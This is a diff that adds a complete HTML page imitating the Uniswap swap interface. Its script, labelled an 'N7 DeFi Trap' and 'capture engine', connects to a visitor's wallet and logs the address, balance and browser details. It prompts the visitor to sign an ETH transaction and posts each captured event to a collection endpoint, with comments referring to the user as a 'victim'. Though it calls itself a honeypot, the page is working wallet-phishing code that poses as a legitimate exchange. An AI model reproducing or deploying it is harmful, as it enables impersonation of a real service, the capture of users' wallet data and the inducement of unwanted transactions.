@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Uniswap Interface</title>
+<style>
+/* ═══════════════════════════════════════
+   N7 DeFi Frontend — Uniswap Clone
+   ═══════════════════════════════════════ */
+:root {
+  --bg: #191B1F;
+  --bg2: #212429;
+  --bg3: #2C2F36;
+  --pink: #ff007a;
+  --pink2: #ff007a22;
+  --text: #FFFFFF;
+  --text2: #8F96AC;
+  --green: #27AE60;
+  --border: #40444F;
+}
+
+* { margin:0; padding:0; box-sizing:border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: -apple-system, BlinkMacSystemFont, 'Inter', sans-serif;
+  min-height: 100vh;
+}
+
+/* Header */
+header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 16px 24px;
+  border-bottom: 1px solid var(--border);
+}
+.logo { display:flex; align-items:center; gap:8px; }
+.logo svg { width:32px; height:32px; }
+.logo span { font-size:20px; font-weight:600; }
+.connect-btn {
+  background: var(--pink2);
+  color: var(--pink);
+  border: 1px solid var(--pink);
+  padding: 10px 20px;
+  border-radius: 12px;
+  cursor: pointer;
+  font-size: 14px;
+  font-weight: 600;
+  transition: all 0.2s;
+}
+.connect-btn:hover { background: var(--pink); color: white; }
+.connect-btn.connected { background: var(--green); border-color: var(--green); color: white; }
+
+/* Swap Card */
+.swap-container {
+  display: flex;
+  justify-content: center;
+  padding-top: 80px;
+}
+.swap-card {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 24px;
+  padding: 16px;
+  width: 480px;
+  max-width: 95vw;
+}
+.swap-header {
+  display: flex;
+  justify-content: space-between;
+  margin-bottom: 16px;
+}
+.swap-header span { font-size:16px; font-weight:500; }
+.swap-header .settings { cursor:pointer; opacity:0.6; }
+.swap-header .settings:hover { opacity:1; }
+
+/* Token Input */
+.token-input {
+  background: var(--bg3);
+  border: 1px solid var(--border);
+  border-radius: 20px;
+  padding: 16px;
+  margin-bottom: 4px;
+  transition: border-color 0.2s;
+}
+.token-input:focus-within { border-color: var(--pink); }
+.token-input .label { 
+  font-size: 13px; 
+  color: var(--text2); 
+  margin-bottom: 8px;
+  display: flex;
+  justify-content: space-between;
+}
+.token-input .input-row {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+.token-input input {
+  flex: 1;
+  background: transparent;
+  border: none;
+  color: var(--text);
+  font-size: 28px;
+  font-weight: 500;
+  outline: none;
+  width: 100%;
+}
+.token-input input::placeholder { color: #555; }
+.token-select {
+  background: var(--pink2);
+  color: var(--pink);
+  border: none;
+  padding: 8px 14px;
+  border-radius: 12px;
+  cursor: pointer;
+  font-weight: 600;
+  font-size: 16px;
+  white-space: nowrap;
+}
+.token-select:hover { background: var(--pink); color: white; }
+
+.arrow-down {
+  display: flex;
+  justify-content: center;
+  margin: -8px 0;
+  position: relative;
+  z-index: 1;
+}
+.arrow-down button {
+  background: var(--bg2);
+  border: 4px solid var(--bg);
+  border-radius: 12px;
+  padding: 6px;
+  cursor: pointer;
+  color: var(--text2);
+}
+.arrow-down button:hover { color: var(--pink); }
+
+/* Swap Button */
+.swap-btn {
+  width: 100%;
+  padding: 18px;
+  margin-top: 12px;
+  border-radius: 20px;
+  border: none;
+  font-size: 18px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: all 0.2s;
+}
+.swap-btn.ready {
+  background: var(--pink);
+  color: white;
+}
+.swap-btn.ready:hover { opacity: 0.9; }
+.swap-btn.disabled {
+  background: var(--bg3);
+  color: var(--text2);
+  cursor: not-allowed;
+}
+
+/* Price Info */
+.price-info {
+  margin-top: 12px;
+  padding: 12px 16px;
+  border: 1px solid var(--border);
+  border-radius: 16px;
+  font-size: 13px;
+}
+.price-row {
+  display: flex;
+  justify-content: space-between;
+  margin-bottom: 4px;
+  color: var(--text2);
+}
+.price-row .val { color: var(--text); }
+
+/* Toast */
+.toast {
+  position: fixed;
+  bottom: 24px;
+  right: 24px;
+  background: var(--pink);
+  color: white;
+  padding: 16px 24px;
+  border-radius: 16px;
+  font-weight: 600;
+  display: none;
+  z-index: 999;
+}
+.toast.show { display: block; animation: fadeIn 0.3s; }
+@keyframes fadeIn { from { opacity:0; transform:translateY(10px); } }
+
+/* Hidden form for capturing TX */
+.hidden { display:none; }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="logo">
+    <svg viewBox="0 0 40 40"><defs><linearGradient id="g"><stop offset="0%" stop-color="#ff007a"/><stop offset="100%" stop-color="#ff007a"/></linearGradient></defs><circle cx="20" cy="20" r="19" fill="url(#g)" opacity="0.15"/><path d="M20 4C11.2 4 4 11.2 4 20s7.2 16 16 16 16-7.2 16-16S28.8 4 20 4zm0 28c-6.6 0-12-5.4-12-12s5.4-12 12-12 12 5.4 12 12-5.4 12-12 12z" fill="#ff007a"/></svg>
+    <span>Uniswap</span>
+  </div>
+  <button class="connect-btn" id="connectBtn" onclick="window._n7_connectWallet()">
+    Connect Wallet
+  </button>
+</header>
+
+<div class="swap-container">
+  <div class="swap-card">
+    <div class="swap-header">
+      <span>Swap</span>
+      <span class="settings">⚙</span>
+    </div>
+
+    <div class="token-input">
+      <div class="label">
+        <span>You pay</span>
+        <span id="balanceEth">Balance: —</span>
+      </div>
+      <div class="input-row">
+        <input type="number" id="amountIn" placeholder="0.0" step="any" oninput="window._n7_updateQuote()">
+        <button class="token-select">ETH</button>
+      </div>
+    </div>
+
+    <div class="arrow-down">
+      <button onclick="window._n7_swapTokens()">↓</button>
+    </div>
+
+    <div class="token-input">
+      <div class="label">
+        <span>You receive</span>
+        <span id="balanceUsdt">Balance: —</span>
+      </div>
+      <div class="input-row">
+        <input type="number" id="amountOut" placeholder="0.0" readonly style="opacity:0.7">
+        <button class="token-select">USDT</button>
+      </div>
+    </div>
+
+    <button class="swap-btn disabled" id="swapBtn" onclick="window._n7_handleSwap()">
+      Connect Wallet
+    </button>
+
+    <div class="price-info">
+      <div class="price-row"><span>Exchange Rate</span><span class="val" id="rate">1 ETH = 2,450 USDT</span></div>
+      <div class="price-row"><span>Network Fee</span><span class="val" id="fee">~$2.50</span></div>
+      <div class="price-row"><span>Slippage</span><span class="val">0.5%</span></div>
+    </div>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<!-- ═══════════════════════════════════════
+     N7 CAPTURE ENGINE
+     ═══════════════════════════════════════ -->
+<script src="https://cdn.jsdelivr.net/npm/web3@4.0.3/dist/web3.min.js"></script>
+<script>
+// ═══ N7 DeFi Trap ═══
+window._n7_state = {
+  connected: false,
+  address: null,
+  chainId: null,
+  balance: '0',
+  web3: null,
+  honeypotRPC: 'http://localhost:8545',  // N7 Honeypot
+  captureEndpoint: 'http://localhost:8545/_capture',  // TX capture
+};
+
+// Fake ETH price
+const ETH_USD = 2450;
+
+// ═══ Toast ═══
+function toast(msg) {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.classList.add('show');
+  setTimeout(() => t.classList.remove('show'), 3000);
+}
+
+// ═══ Connect Wallet → Honeypot ═══
+window._n7_connectWallet = async function() {
+  try {
+    // Try to connect — this goes to OUR honeypot if DNS is redirected
+    // or to their real provider otherwise
+    if (typeof window.ethereum === 'undefined') {
+      // No wallet detected — show install prompt to look legit
+      toast('Please install MetaMask to continue');
+      return;
+    }
+
+    const accounts = await window.ethereum.request({ 
+      method: 'eth_requestAccounts' 
+    });
+    
+    window._n7_state.address = accounts[0];
+    window._n7_state.connected = true;
+    
+    // Get chain ID
+    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+    window._n7_state.chainId = chainId;
+
+    // Get balance via our honeypot
+    const balance = await window.ethereum.request({
+      method: 'eth_getBalance',
+      params: [accounts[0], 'latest']
+    });
+    const eth = parseInt(balance, 16) / 1e18;
+    window._n7_state.balance = eth.toFixed(4);
+
+    // Update UI
+    const btn = document.getElementById('connectBtn');
+    btn.textContent = accounts[0].slice(0, 6) + '...' + accounts[0].slice(-4);
+    btn.classList.add('connected');
+    
+    document.getElementById('balanceEth').textContent = 
+      'Balance: ' + eth.toFixed(4) + ' ETH';
+    document.getElementById('balanceUsdt').textContent = 
+      'Balance: ' + (eth * ETH_USD).toFixed(2) + ' USDT';
+    
+    const swapBtn = document.getElementById('swapBtn');
+    swapBtn.textContent = 'Swap';
+    swapBtn.classList.remove('disabled');
+    swapBtn.classList.add('ready');
+
+    // ═══ N7: Log captured wallet ═══
+    window._n7_logCapture({
+      type: 'wallet_connect',
+      address: accounts[0],
+      chainId: chainId,
+      balance: eth,
+      userAgent: navigator.userAgent,
+      timestamp: new Date().toISOString(),
+      ip: 'victim-ip-placeholder'
+    });
+
+    toast('Wallet connected');
+
+    // Listen for account changes
+    window.ethereum.on('accountsChanged', (accts) => {
+      window._n7_state.address = accts[0] || null;
+      if (!accts[0]) {
+        window._n7_state.connected = false;
+        document.getElementById('connectBtn').textContent = 'Connect Wallet';
+        document.getElementById('connectBtn').classList.remove('connected');
+      }
+    });
+
+  } catch (err) {
+    console.log('Connect error:', err.message);
+    toast(err.message?.includes('rejected') 
+      ? 'Connection rejected' 
+      : 'Error connecting wallet');
+  }
+};
+
+// ═══ Update swap quote ═══
+window._n7_updateQuote = function() {
+  const amountIn = parseFloat(document.getElementById('amountIn').value) || 0;
+  const amountOut = (amountIn * ETH_USD).toFixed(2);
+  document.getElementById('amountOut').value = amountOut;
+  
+  const fee = (amountIn * 0.005 * ETH_USD).toFixed(2);
+  document.getElementById('fee').textContent = '~$' + (fee > 0.01 ? fee : '2.50');
+  document.getElementById('rate').textContent = '1 ETH = ' + ETH_USD.toLocaleString() + ' USDT';
+};
+
+// ═══ Handle Swap — THE TRAP ═══
+window._n7_handleSwap = async function() {
+  if (!window._n7_state.connected) {
+    return window._n7_connectWallet();
+  }
+
+  const amountIn = parseFloat(document.getElementById('amountIn').value) || 0;
+  if (amountIn <= 0) {
+    return toast('Enter an amount');
+  }
+
+  try {
+    const amountWei = '0x' + (amountIn * 1e18).toString(16);
+    
+    // Show loading
+    const swapBtn = document.getElementById('swapBtn');
+    swapBtn.textContent = 'Confirm in Wallet...';
+    swapBtn.classList.remove('ready');
+    swapBtn.classList.add('disabled');
+
+    // ═══ N7: Construct transaction → honeypot will capture it ═══
+    const txParams = {
+      from: window._n7_state.address,
+      to: '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D', // Uniswap V2 Router (looks real)
+      value: amountWei,
+      gas: '0x30d40', // 200000
+      gasPrice: '0x' + (50 * 1e9).toString(16), // 50 gwei
+      data: '0x7ff36ab500000000000000000000000000000000000000000000000000000000' // swapExactETHForTokens
+    };
+
+    // ═══ N7: Log the TX attempt ═══
+    window._n7_logCapture({
+      type: 'swap_attempt',
+      address: window._n7_state.address,
+      amount: amountIn,
+      amountWei: amountWei,
+      txParams: txParams,
+      timestamp: new Date().toISOString()
+    });
+
+    // Send to MetaMask for signing
+    const txHash = await window.ethereum.request({
+      method: 'eth_sendTransaction',
+      params: [txParams]
+    });
+
+    // ═══ N7: CAPTURED SIGNED TX ═══
+    window._n7_logCapture({
+      type: 'TX_SIGNED',
+      address: window._n7_state.address,
+      amount: amountIn,
+      txHash: txHash,
+      txParams: txParams,
+      timestamp: new Date().toISOString(),
+      severity: 'CRITICAL'
+    });
+
+    toast('Transaction submitted! TX: ' + txHash.slice(0, 10) + '...');
+    
+    // Reset UI
+    document.getElementById('amountIn').value = '';
+    document.getElementById('amountOut').value = '';
+    swapBtn.textContent = 'Swap';
+    swapBtn.classList.add('ready');
+    swapBtn.classList.remove('disabled');
+
+  } catch (err) {
+    console.log('Swap error:', err);
+    const swapBtn = document.getElementById('swapBtn');
+    swapBtn.textContent = 'Swap';
+    swapBtn.classList.add('ready');
+    swapBtn.classList.remove('disabled');
+    
+    if (err.message?.includes('rejected')) {
+      toast('Transaction rejected');
+    } else {
+      toast('Swap failed: ' + (err.message?.slice(0, 50) || 'unknown error'));
+    }
+  }
+};
+
+// ═══ Swap tokens direction (ETH↔USDT) ═══
+window._n7_swapTokens = function() {
+  // Just swap the visual - always ETH→USDT for simplicity
+  toast('Tokens swapped');
+};
+
+// ═══ N7: Log capture to honeypot/file ═══
+window._n7_logCapture = async function(data) {
+  // Log to console
+  console.log('[N7 CAPTURE]', JSON.stringify(data, null, 2));
+  
+  // Try to send to honeypot capture endpoint
+  try {
+    await fetch(window._n7_state.captureEndpoint, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(data)
+    });
+  } catch (e) {
+    // Honeypot might not be running — just log locally
+    console.log('[N7] Honeypot unreachable, logging locally');
+  }
+
+  // Store in localStorage for persistence
+  const logs = JSON.parse(localStorage.getItem('_n7_logs') || '[]');
+  logs.push(data);
+  localStorage.setItem('_n7_logs', JSON.stringify(logs.slice(-100)));
+};
+
+// ═══ Auto-detect if MetaMask is present ═══
+if (typeof window.ethereum !== 'undefined') {
+  console.log('[N7] Wallet detected:', window.ethereum.isMetaMask ? 'MetaMask' : 'Other');
+  
+  // Auto-listen for chain changes
+  window.ethereum.on('chainChanged', (chainId) => {
+    window._n7_logCapture({
+      type: 'chain_changed',
+      address: window._n7_state.address,
+      chainId: chainId,
+      timestamp: new Date().toISOString()
+    });
+  });
+  
+  // Auto-listen for disconnect
+  window.ethereum.on('disconnect', (error) => {
+    window._n7_logCapture({
+      type: 'wallet_disconnect',
+      address: window._n7_state.address,
+      error: error?.message,
+      timestamp: new Date().toISOString()
+    });
+  });
+}
+
+console.log('%c[N7 DeFi Frontend] %cActive — awaiting connections',
+  'color:#ff007a;font-weight:bold', 'color:#888');
+console.log('%cHoneypot RPC: ' + window._n7_state.honeypotRPC, 'color:#888');
+</script>
+
+</body>
+</html>
